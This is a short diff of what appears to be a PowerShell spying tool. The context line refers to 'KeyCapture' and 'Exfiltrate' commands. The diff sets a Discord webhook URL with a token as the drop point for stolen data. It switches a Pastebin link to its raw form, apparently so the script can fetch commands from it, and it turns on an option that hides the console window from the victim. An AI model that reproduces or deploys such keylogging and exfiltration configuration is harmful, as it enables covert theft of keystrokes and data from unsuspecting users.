@@ -31,7 +31,7 @@ Edit file contents to 'kill' to stop 'KeyCapture' or 'Exfiltrate' command and re
 
 # Uncomment the lines below and add your details
 $hookurl = "https://discord.com/api/webhooks/1060701888200327258/YUPtOPNaTJ8GFNP13Wz6Mi4tWy0DZzX1ntFkXq6JXrHKaVDD09e3Cs_W3CHTC8HN1hlQ" # eg. https://discord.com/api/webhooks/123445623531/f4fw3f4r46r44343t5gxxxxxx
-$GHurl = "https://pastebin.com/aWA7epbs"  # eg. https://pastebin.com/raw/QtCxxxx
+$GHurl = "https://pastebin.com/raw/aWA7epbs"  # eg. https://pastebin.com/raw/QtCxxxx
 
 # HIDE THE WINDOW - Change to 1 to hide the console window
 $HideWindow = 1
